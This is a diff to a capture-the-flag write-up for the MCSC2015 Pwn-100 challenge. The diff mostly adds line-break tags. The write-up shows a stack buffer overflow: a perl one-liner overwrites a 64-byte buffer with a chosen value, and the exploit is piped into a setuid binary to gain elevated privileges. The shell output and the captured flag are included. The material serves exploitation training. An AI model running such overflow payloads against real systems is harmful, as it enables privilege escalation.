@@ -1,5 +1,5 @@
 \#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
-MCSC2015 writeup for Pwn-100<br>
+#MCSC2015 writeup for Pwn-100<br>
 \#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
 
 pwn0@MCSC2015:/challenges/pwn0$ ls -l<br>
@@ -58,23 +58,24 @@ pwn0@MCSC2015:/tmp/testing$ cat wrapper.c<br>
 \#include \<stdlib.h><br>
 int main()<br>
 {<br>
-	execve("/challenges/pwn0/0",NULL,NULL);
-}
-pwn0@MCSC2015:/tmp/testing$ gcc wrapper.c -o wrapper
-pwn0@MCSC2015:/tmp/testing$ ./wrapper 
-Good Boy
-test
-pwn0@MCSC2015:/tmp/testing$
-
-we are finally able to execute the vuln() function, let's try to exploit it:
-The buffer size is 64, 78954 to hexadecimal is 0x1346A
-===========================
-A successful exploitation would be like this:
-pwn0@MCSC2015:/challenges/pwn0$ perl -e 'print "A"x64 . "\x6a\x34\x01\x00"' > /tmp/testing/input
-pwn0@MCSC2015:/challenges/pwn0$ cat /tmp/testing/input -|/tmp/testing/wrapper 
-Good Boy
-You Win
-id      
-uid=1001(pwn0) gid=1001(pwn0) euid=1002(pwned0) egid=1002(pwned0) groups=1002(pwned0),1001(pwn0)
-cat FLAG
-flaG{I_4M_Th3_EaSy_One_Pwn_th3_N3xt_L3vel_If_U_C4N}
+	execve("/challenges/pwn0/0",NULL,NULL);<br>
+}<br>
+pwn0@MCSC2015:/tmp/testing$ gcc wrapper.c -o wrapper<br>
+pwn0@MCSC2015:/tmp/testing$ ./wrapper <br>
+Good Boy<br>
+test<br>
+pwn0@MCSC2015:/tmp/testing$<br>
+<br>
+we are finally able to execute the vuln() function, let's try to exploit it:<br>
+The buffer size is 64, 78954 to hexadecimal is 0x1346A<br>
+===========================<br>
+A successful exploitation would be like this:<br>
+pwn0@MCSC2015:/challenges/pwn0$ perl -e 'print "A"x64 . "\x6a\x34\x01\x00"' > /tmp/testing/input<br>
+pwn0@MCSC2015:/challenges/pwn0$ cat /tmp/testing/input -|/tmp/testing/wrapper <br>
+Good Boy<br>
+You Win<br>
+id<br>      
+uid=1001(pwn0) gid=1001(pwn0) euid=1002(pwned0) egid=1002(pwned0) groups=1002(pwned0),1001(pwn0)<br>
+cat FLAG<br>
+flaG{I_4M_Th3_EaSy_One_Pwn_th3_N3xt_L3vel_If_U_C4N}<br>
+<br>
